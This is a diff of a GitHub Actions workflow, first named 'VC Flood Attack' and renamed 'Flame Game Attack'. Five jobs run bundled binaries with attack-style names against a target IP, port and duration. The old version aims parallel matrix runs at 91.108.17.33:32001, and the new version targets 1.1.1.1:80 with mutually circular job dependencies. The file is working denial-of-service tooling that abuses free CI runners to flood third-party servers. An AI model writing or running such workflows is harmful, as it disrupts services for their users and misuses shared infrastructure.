@@ -1,35 +1,36 @@
-name: VC Flood Attack
-on: [push]
+name: Flame Game Attack
+on: [workflow_dispatch, push]
 
 jobs:
   soul_attack:
     runs-on: ubuntu-22.04
+    needs: [flame_attack, soulcracks_attack, vishal_attack, fuck_attack]
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        n: [1]
     steps:
     - uses: actions/checkout@v3
     - name: Make soul executable and run attack
       run: |
         chmod +x soul
-        ./soul 91.108.17.33 32001 200
+        ./soul 1.1.1.1 80 80
 
   flame_attack:
     runs-on: ubuntu-22.04
+    needs: [soul_attack, soulcracks_attack, vishal_attack, fuck_attack]
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        n: [2]
     steps:
     - uses: actions/checkout@v3
     - name: Make flame executable and run attack
       run: |
         chmod +x flame
-        ./flame 91.108.17.33 32001 200
+        ./flame 1.1.1.1 80 80
 
   soulcracks_attack:
     runs-on: ubuntu-22.04
+    needs: [soul_attack, flame_attack, vishal_attack, fuck_attack]
     strategy:
       matrix:
         n: [999]
@@ -38,23 +39,24 @@ jobs:
     - name: Make soulcracks executable and run attack
       run: |
         chmod +x soulcracks
-        ./soulcracks 91.108.17.33 32001 200 ${{ matrix.n }}
+        ./soulcracks 1.1.1.1 80 80 ${{ matrix.n }}
 
   vishal_attack:
     runs-on: ubuntu-22.04
+    needs: [soul_attack, flame_attack, soulcracks_attack, fuck_attack]
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        n: [4]
     steps:
     - uses: actions/checkout@v3
     - name: Make vishal executable and run attack
       run: |
         chmod +x vishal
-        ./vishal 91.108.17.33 32001 200
+        ./vishal 1.1.1.1 80 80
 
   fuck_attack:
     runs-on: ubuntu-22.04
+    needs: [soul_attack, flame_attack, soulcracks_attack, vishal_attack]
     strategy:
       matrix:
         n: [1400]
@@ -63,5 +65,5 @@ jobs:
     - name: Make fuck executable and run attack
       run: |
         chmod +x fuck
-        ./fuck 91.108.17.33 32001 200 ${{ matrix.n }}
+        ./fuck 1.1.1.1 80 80 ${{ matrix.n }}
 
